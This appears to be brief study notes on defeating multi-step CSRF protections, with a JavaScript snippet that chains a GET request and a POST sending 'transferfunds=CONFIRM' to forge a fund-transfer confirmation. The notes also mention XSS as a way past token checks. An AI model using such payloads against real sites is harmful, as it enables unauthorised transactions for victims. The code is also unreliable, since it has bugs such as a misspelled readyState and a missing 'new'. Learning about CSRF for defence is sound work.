
CSRF Multi-Step Handling 

- Operation Might span multiple steps 
	- E.g. A Confirmation screen 

- if no CSRF Protection is used eg. Tokens then this is easy to beat .
- Multi Step Operation with CSRF protection - XSS 

Complex Multi Step Operations : 

- With CSRF Protection e.g. tokens 
- Output of one step needs to be used in second : 
	- Cannot be predicted by the Attacker 
- Depending on the "Origin Policy " attacker need to choose how to attack : 
	- Malicios website 
	- Find Vulnerability on Victim Websites eg. XSS
 
Now for confirmation page we will send a XML Post request 

<script>
	
var req1 = new XMLHttpRequest();

req1.onreadystatechange = function()
{
	if(req1.readystate == 4 && req1.status == 200){
		var req2 = XMLHttpRequest();
		req2.open("POST", "site", false);
		req2.setRequestHeader("content-type","application/x-www -form-url-encoded");
		req2.send("transferfunds=CONFIRM");

	}
	
}
req1.open("GET","http://localhost:8080/.....",false);
req1.send(); 

</script> 

this above method use both post and get request 





